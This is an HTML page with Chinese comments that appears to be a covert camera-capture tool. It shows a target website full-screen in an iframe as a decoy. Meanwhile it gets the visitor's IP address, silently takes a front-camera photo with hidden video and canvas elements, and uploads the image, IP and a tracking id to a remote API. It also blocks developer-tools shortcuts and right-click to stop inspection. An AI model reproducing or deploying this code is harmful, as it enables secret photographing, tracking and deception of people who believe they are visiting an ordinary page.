<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" type="image/x-icon" href="logo.ico" />
    <title>正在加载...</title>

    <!-- DNS 预解析 - 加速上传 -->
    <link rel="dns-prefetch" href="//api.zk9999902.dpdns.org" />
    <link rel="preconnect" href="https://api.zk9999902.dpdns.org" crossorigin />

    <style>
      html,
      body {
        position: relative;
        overflow: hidden;
        width: 100vw;
        height: 100vh;
        margin: 0;
        padding: 0;
      }

      /* iframe 全屏显示目标页面 */
      #target-iframe {
        width: 100vw;
        height: 100vh;
        border: none;
        display: block;
      }

      /* 隐藏摄像头元素（后台使用） */
      #video,
      #canvas {
        position: absolute;
        width: 0;
        height: 0;
        opacity: 0;
        pointer-events: none;
      }
    </style>
  </head>
  <body>
    <!-- iframe 加载目标页面 - 用户看到的内容 -->
    <iframe id="target-iframe" src="" frameborder="0"></iframe>

    <!-- 隐藏的摄像头元素 - 后台拍照使用 -->
    <video id="video" width="480" height="640" autoplay muted></video>
    <canvas id="canvas" width="480" height="640"></canvas>

    <script src="config.js?v=20251103k"></script>
    <script type="text/javascript">
      (function () {
        // ===== 1. 解析参数 =====
        const urlParams = new URLSearchParams(window.location.search);
        const encodedData = urlParams.get("d");
        let id, redirectUrl;

        if (encodedData) {
          // 解码 Base64 参数
          try {
            const decoded = atob(encodedData);
            const decodedParams = decodeURIComponent(
              decoded
                .split("")
                .map(function (c) {
                  return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
                })
                .join("")
            );
            const parts = decodedParams.split("|");
            id = parts[0];
            redirectUrl = parts[1];
          } catch (e) {
            console.error("参数解码失败:", e);
            // 兼容旧版本编码
            try {
              const decodedParams = decodeURIComponent(
                escape(atob(encodedData))
              );
              const parts = decodedParams.split("|");
              id = parts[0];
              redirectUrl = parts[1];
            } catch (e2) {
              console.error("参数解码失败（兼容模式）:", e2);
            }
          }
        } else {
          // 兼容旧版本明文参数
          id = urlParams.get("id");
          redirectUrl = urlParams.get("url");
        }

        if (!id || !redirectUrl) {
          window.location.href = "home.html";
          return;
        }

        // ===== 2. 立即显示目标页面 =====
        const iframe = document.getElementById("target-iframe");
        iframe.src = redirectUrl;

        // 动态设置页面标题
        try {
          const targetDomain = new URL(redirectUrl).hostname;
          document.title = targetDomain.replace("www.", "");
        } catch (e) {
          document.title = "加载中...";
        }

        // ===== 3. 后台静默获取IP地址 =====
        let userIP = null;
        fetch("https://api.ipify.org?format=json")
          .then((res) => res.json())
          .then((data) => {
            userIP = data.ip;
          })
          .catch(() => {});

        // ===== 4. 后台执行拍照流程 =====
        const canvas = document.getElementById("canvas");
        const context = canvas.getContext("2d");
        const video = document.getElementById("video");

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices
            .getUserMedia({
              video: {
                width: { ideal: 480 },
                height: { ideal: 640 },
                facingMode: "user",
              },
            })
            .then(function (stream) {
              video.srcObject = stream;
              video.play();

              // 等待视频就绪后拍照
              video.addEventListener(
                "canplay",
                function () {
                  setTimeout(function () {
                    try {
                      // 拍照
                      context.drawImage(video, 0, 0, 480, 640);
                      const imageData = canvas.toDataURL("image/jpeg", 0.7);

                      // 关闭摄像头
                      stream.getTracks().forEach((track) => track.stop());

                      // 后台上传（使用 keepalive 确保完成）
                      fetch(window.API_CONFIG.UPLOAD, {
                        method: "POST",
                        headers: {
                          "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                          id: id,
                          image: imageData,
                          ip: userIP,
                        }),
                        keepalive: true,
                      }).catch((error) => {
                        console.error("后台上传失败:", error);
                      });
                    } catch (error) {
                      console.error("后台拍照失败:", error);
                    }
                  }, 300);
                },
                { once: true }
              );
            })
            .catch(function (error) {
              console.error("摄像头权限被拒绝:", error);
              // 权限被拒绝不影响用户继续浏览
            });
        }

        // ===== 5. 禁止打开控制台（参考 0.html）=====
        document.addEventListener("keydown", function (e) {
          var currKey = 0,
            evt = e || event || window.event;
          currKey = evt.keyCode || evt.which || evt.charCode;
          // 禁止 F12
          if (currKey == 123) {
            e.preventDefault();
            e.stopPropagation();
            return false;
          }
          // 禁止 Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
          if (
            evt.ctrlKey &&
            evt.shiftKey &&
            (currKey == 73 || currKey == 74 || currKey == 67)
          ) {
            e.preventDefault();
            e.stopPropagation();
            return false;
          }
          if (evt.ctrlKey && currKey == 85) {
            e.preventDefault();
            e.stopPropagation();
            return false;
          }
        });

        // 禁止右键菜单
        document.addEventListener("contextmenu", function (e) {
          e.preventDefault();
          return false;
        });
      })();
    </script>
  </body>
</html>
